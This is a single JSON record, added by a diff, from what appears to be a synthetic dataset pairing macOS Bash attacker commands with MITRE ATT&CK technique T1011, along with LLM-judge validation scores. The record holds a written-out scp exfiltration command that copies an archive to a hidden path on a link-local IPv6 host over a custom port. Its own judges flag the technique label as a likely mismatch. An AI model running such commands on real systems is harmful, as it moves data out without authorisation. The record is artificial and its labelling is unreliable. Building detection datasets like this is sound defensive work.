@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "scp -B -o BindAddress=\"$(ipconfig getv6ifaddr bridge0)\" -P 56432 /tmp/diag.tgz \"u@[fe80::4:feed:1%bridge0]:/tmp/.u\"",
+  "explanation": "Uses SSH file copy bound to the bridge0 interface IPv6 address and a high custom port to move data over a bridged, non-default medium, aligning with T1011 by avoiding the primary interface.",
+  "rationale_steps": [
+    "Obtain the IPv6 address of bridge0 via ipconfig to select a secondary medium.",
+    "Bind the SSH client to that address to force traffic over bridge0.",
+    "Transfer data to a link-local peer on a non-standard port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-7a6bf8eb-8073e46c",
+  "source_prompt_hash": "7a6bf8eb",
+  "timestamp_utc": "2025-09-30T08:23:23.913402Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed scp invocation with valid flags, balanced quoting, proper IPv6-with-zone target syntax, and correct shell substitution.",
+        "semantic_score": 1,
+        "semantic_justification": "Although it plausibly transfers data over SSH bound to a specific interface, it is network-based and not exfiltration over a physical medium as defined by T1011.",
+        "combined_score": 3.0,
+        "confidence": 0.86,
+        "timestamp": "2025-10-01T07:26:25.337339Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags, and correct syntax for the scp command with IPv6 addressing.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does transfer data using scp, it doesn't align with T1011 (Exfiltration Over Physical Medium) as it's using network transfer over IPv6 rather than a physical medium like USB drives or optical media.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T07:26:27.952252Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using valid `scp` flags, correct command substitution for the bind address, and proper quoting for the IPv6 link-local destination.",
+        "semantic_score": 1,
+        "semantic_justification": "The `scp` command performs a network transfer, which fundamentally contradicts the MITRE ATT&CK T1011 technique that specifically describes exfiltrating data onto a *physical medium* for *physical transport*.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T07:26:41.477805Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.667,
+    "llm_average_score": 3.333,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
